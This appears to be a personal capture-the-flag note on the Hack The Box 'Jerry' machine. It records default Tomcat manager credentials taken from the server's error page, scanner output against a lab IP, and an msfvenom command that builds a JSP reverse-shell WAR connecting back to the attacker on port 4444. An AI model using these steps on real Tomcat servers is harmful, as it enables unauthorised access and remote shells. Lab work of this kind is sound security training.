```
 You are not authorized to view this page.

If you have already configured the Manager application to allow access and you have used your browsers back button, used a saved book-mark or similar then you may have triggered the cross-site request forgery (CSRF) protection that has been enabled for the HTML interface of the Manager application. You will need to reset this protection by returning to the main Manager page. Once you return to this page, you will be able to continue using the Manager application's HTML interface normally. If you continue to see this access denied message, check that you have the necessary permissions to access this application.

If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.

For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.

<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>

Note that for Tomcat 7 onwards, the roles required to use the manager application were changed from the single manager role to the following four roles. You will need to assign the role(s) required for the functionality you wish to access.

    manager-gui - allows access to the HTML GUI and the status pages
    manager-script - allows access to the text interface and the status pages
    manager-jmx - allows access to the JMX proxy and the status pages
    manager-status - allows access to the status pages only

The HTML interface is protected against CSRF but the text and JMX interfaces are not. To maintain the CSRF protection:

    Users with the manager-gui role should not be granted either the manager-script or manager-jmx roles.
    If the text or jmx interfaces are accessed through a browser (e.g. for testing since these interfaces are intended for tools not humans) then the browser must be closed afterwards to terminate the session.

For more information - please see the Manager App HOW-TO. 
```

```
/examples/jsp/num/numguess.jsp
/examples/jsp/dates/date.jsp
/examples/jsp/snp/snoop.jsp
/examples/jsp/error/error.html
/examples/jsp/sessions/carts.html
/examples/jsp/checkbox/check.html
/examples/jsp/colors/colors.html
/examples/jsp/cal/login.html
/examples/jsp/include/include.jsp
/examples/jsp/forward/forward.jsp
/examples/jsp/plugin/plugin.jsp
/examples/jsp/jsptoserv/jsptoservlet.jsp
/examples/jsp/simpletag/foo.jsp
/examples/jsp/mail/sendmail.jsp
/examples/servlet/HelloWorldExample
/examples/servlet/RequestInfoExample
/examples/servlet/RequestHeaderExample
/examples/servlet/RequestParamExample
/examples/servlet/CookieExample
/examples/servlet/JndiServlet
/examples/servlet/SessionExample
/tomcat-docs/appdev/sample/web/hello.jsp
```

```
dyallo in ~/Documents/Proyectos/hack-the-box/machines/jerry on main ● ● λ apachetomcatscanner -tt 10.129.136.9 -tp -   
Apache Tomcat Scanner v3.7.2 - by @podalirius_

[+] Targeting 65536 ports on 1 hosts.
[+] Searching for Apache Tomcats servers on specified targets ...
[2024/05/17 22h20m00s] Status (65536/65536) 100.00 % | Rate 0 tests/s           
[+] All done!
dyallo in ~/Documents/Proyectos/hack-the-box/machines/jerry on main ● ● λ apachetomcatscanner -tt 10.129.136.9 -tp - --list-cves
Apache Tomcat Scanner v3.7.2 - by @podalirius_

[+] Targeting 65536 ports on 1 hosts.
[+] Searching for Apache Tomcats servers on specified targets ...
[2024/05/17 22h20m37s] Status (65536/65536) 100.00 % | Rate 0 tests/s           
[+] All done!
dyallo in ~/Documents/Proyectos/hack-the-box/machines/jerry on main ● ● λ 
```

```
tomcat
s3cret
```

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f war -o revshell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: revshell.war
```

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```

## Links
- https://github.com/kh4sh3i/Apache-Tomcat-Pentesting
- https://stackoverflow.com/a/12806389
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat